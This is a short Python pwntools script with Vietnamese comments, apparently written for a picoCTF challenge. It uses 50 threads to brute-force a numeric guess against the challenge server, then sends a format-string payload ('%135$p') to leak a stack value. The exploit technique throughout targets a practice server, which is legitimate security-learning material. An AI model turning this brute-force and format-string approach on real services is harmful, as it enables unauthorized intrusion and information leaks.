from pwn import *
import threading
import contextlib  # Thêm dòng này để nhập contextlib

def brute_force(start, end):
    for i in range(start, end):
        with contextlib.redirect_stdout(None):  # Disable stdout to prevent race conditions in printing
            r = remote('jupiter.challenges.picoctf.org', 57529)
            r.sendlineafter(b"guess?\n" , str(i))
            response = r.recv()
            if b"win" in response:
                log.info(f"Win key: {i}")
                r.sendline(b"%135$p")
                r.recv()
            r.close()

if __name__ == "__main__":
    binary = context.binary = ELF("./vuln")
    
    num_threads = 50  # Số luồng bạn muốn tạo
    total_range = 8192  # Tổng khoảng giá trị từ -4096 đến 4096
    step = 200  # Số lượng giá trị mỗi luồng sẽ kiểm tra
    
    threads = []
    start_range = -4096
    
    for _ in range(num_threads):
        end_range = start_range + step
        thread = threading.Thread(target=brute_force, args=(start_range, end_range))
        threads.append(thread)
        thread.start()
        start_range = end_range
    
    # Đợi tất cả các luồng hoàn thành
    for thread in threads:
        thread.join()
